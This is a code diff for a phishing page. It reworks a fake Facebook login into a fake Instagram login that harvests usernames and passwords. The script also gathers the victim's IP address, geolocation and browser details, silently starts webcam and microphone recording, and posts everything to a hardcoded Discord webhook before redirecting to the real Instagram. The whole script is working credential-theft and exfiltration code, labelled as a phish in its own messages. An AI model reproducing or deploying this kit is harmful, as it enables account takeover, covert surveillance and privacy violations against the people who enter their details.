@@ -3,45 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log In or Sign Up</title>
+    <title>Instagram</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { display: flex; width: 980px; justify-content: space-between; align-items: center; }
-        .left-side { width: 500px; }
-        .left-side h1 { color: #1877f2; font-size: 60px; margin: 0; padding: 0; }
-        .left-side p { font-size: 28px; line-height: 32px; margin-top: 10px; }
-        .right-side { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); width: 396px; text-align: center; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
-        button { background-color: #1877f2; color: #fff; font-size: 20px; font-weight: bold; padding: 10px 16px; width: 100%; border: none; border-radius: 6px; cursor: pointer; margin-top: 6px; }
-        button:hover { background-color: #166fe5; }
-        .forgot { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin-top: 16px; }
-        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
-        .create-btn { background-color: #42b72a; color: #fff; font-size: 17px; font-weight: bold; padding: 14px 16px; border: none; border-radius: 6px; cursor: pointer; display: inline-block; }
-        .create-btn:hover { background-color: #36a420; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 30px; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; font-size: 12px; }
+        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:disabled { background: #b2dffc; }
+        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
+        .divider span { padding: 0 10px; }
+        .forgot { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 20px; display: block; }
+        .signup-box { background: white; border: 1px solid #dbdbdb; padding: 20px; width: 350px; text-align: center; margin-top: 10px; font-size: 14px; }
+        .signup-box a { color: #0095f6; text-decoration: none; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="left-side">
-            <h1>facebook</h1>
-            <p>Connect with friends and the world around you on Facebook.</p>
-        </div>
-        <div class="right-side">
+    <div>
+        <div class="container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo">
             <form id="loginForm">
-                <input type="text" id="email" placeholder="Email or phone number" required>
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                 <input type="password" id="password" placeholder="Password" required>
                 <button type="submit" id="loginBtn">Log In</button>
-                <a href="#" class="forgot" id="forgotBtn">Forgot password?</a>
-                <div class="divider"></div>
-                <button type="button" class="create-btn" id="registerBtn">Create new account</button>
             </form>
+            <div class="divider"><span>OR</span></div>
+            <a href="#" class="forgot">Forgot password?</a>
+        </div>
+        <div class="signup-box">
+            Don't have an account? <a href="#">Sign up</a>
         </div>
     </div>
 
     <script>
         const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
 
-        async function getIPAndLocation() {
+        async function getIPData() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 return await res.json();
@@ -50,25 +48,12 @@
             }
         }
 
-        function getOSAndBrowser() {
-            const ua = navigator.userAgent;
-            let os = "Unknown OS";
-            if (ua.indexOf("Win") != -1) os = "Windows";
-            if (ua.indexOf("Mac") != -1) os = "MacOS";
-            if (ua.indexOf("Linux") != -1) os = "Linux";
-            if (ua.indexOf("Android") != -1) os = "Android";
-            if (ua.indexOf("like Mac") != -1) os = "iOS";
-
-            let browser = "Unknown Browser";
-            if (ua.indexOf("Firefox") > -1) browser = "Firefox";
-            else if (ua.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
-            else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
-            else if (ua.indexOf("Trident") > -1) browser = "Internet Explorer";
-            else if (ua.indexOf("Edge") > -1) browser = "Edge";
-            else if (ua.indexOf("Chrome") > -1) browser = "Chrome";
-            else if (ua.indexOf("Safari") > -1) browser = "Safari";
-
-            return { os, browser };
+        function getBrowserData() {
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform
+            };
         }
 
         async function captureMedia() {
@@ -92,26 +77,39 @@
                 };
                 
                 mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 5000);
-            } catch (err) {
-                console.error("Media capture failed:", err);
+                setTimeout(() => mediaRecorder.stop(), 5000); // Record 5 seconds
+            } catch (e) {
+                console.error("Media capture failed", e);
             }
         }
 
-        async function sendData(action, email = '', password = '') {
-            const geo = await getIPAndLocation();
-            const sys = getOSAndBrowser();
-            const time = new Date().toISOString();
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            // Start media capture silently
+            captureMedia();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const ipData = await getIPData();
+            const browserData = getBrowserData();
+            const timestamp = new Date().toISOString();
 
             const payload = {
-                content: `**New Facebook Phish Action: ${action}**\n` +
-                         `**Email:** ${email}\n` +
-                         `**Password:** ${password}\n` +
-                         `**IP:** ${geo.ip}\n` +
-                         `**Location:** ${geo.city}, ${geo.region}, ${geo.country_name}\n` +
-                         `**OS:** ${sys.os}\n` +
-                         `**Browser:** ${sys.browser}\n` +
-                         `**Time:** ${time}`
+                content: "@everyone New Login Captured!",
+                embeds: [{
+                    title: "Instagram Phish Result",
+                    color: 14423100,
+                    fields: [
+                        { name: "Username", value: username, inline: true },
+                        { name: "Password", value: password, inline: true },
+                        { name: "IP Address", value: ipData.ip, inline: false },
+                        { name: "Location", value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`, inline: false },
+                        { name: "OS/Platform", value: browserData.platform, inline: true },
+                        { name: "User Agent", value: browserData.userAgent, inline: false },
+                        { name: "Timestamp", value: timestamp, inline: false }
+                    ]
+                }]
             };
 
             await fetch(WEBHOOK_URL, {
@@ -119,28 +117,11 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-        }
 
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            captureMedia();
-            
-            await sendData('LOG IN', email, password);
-            
-            window.location.href = 'https://www.facebook.com';
-        });
-
-        document.getElementById('forgotBtn').addEventListener('click', (e) => {
-            e.preventDefault();
-            sendData('FORGOT PASSWORD CLICKED');
-        });
-
-        document.getElementById('registerBtn').addEventListener('click', (e) => {
-            e.preventDefault();
-            sendData('REGISTER CLICKED');
+            // Redirect to real instagram after a delay
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com';
+            }, 5500);
         });
     </script>
 </body>
